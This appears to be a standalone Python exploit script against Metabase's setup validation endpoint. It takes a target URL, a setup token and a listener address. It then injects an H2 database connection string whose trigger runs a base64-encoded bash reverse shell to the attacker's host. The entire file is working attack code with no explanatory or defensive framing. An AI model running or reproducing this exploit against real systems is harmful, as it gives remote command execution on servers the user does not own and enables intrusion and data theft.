import requests
import argparse
import base64

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", type=str, required=True, help="Target URL")
parser.add_argument("-t", "--token", type=str, required=True, help="Setup-Token From /api/session/properties")
parser.add_argument("-i", "--ip", type=str, required=True, help="Listening IP")
parser.add_argument("-p", "--port", type=str, required=True, help="Listening Port")
args = parser.parse_args()

rev = f"bash -i >& /dev/tcp/{args.ip}/{args.port} 0>&1"
b_rev = base64.b64encode(rev.encode()).decode()

headers = {
    "Accept": "application/json", 
    "Content-Type": "application/json", 
    "Connection": "close"
}

payload = {
    "token": f"{args.token}",
    "details":
    {
        "is_on_demand": False,
        "is_full_sync": False,
        "is_sample": False,
        "cache_ttl": False,
        "refingerprint": False,
        "auto_run_queries": False,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{0}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x".format(b_rev),
            "advanced-options": False,
            "ssl": True
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}

url = args.url + "/api/setup/validate"
attk = requests.post(url, headers=headers, json=payload)
print("Check your listener")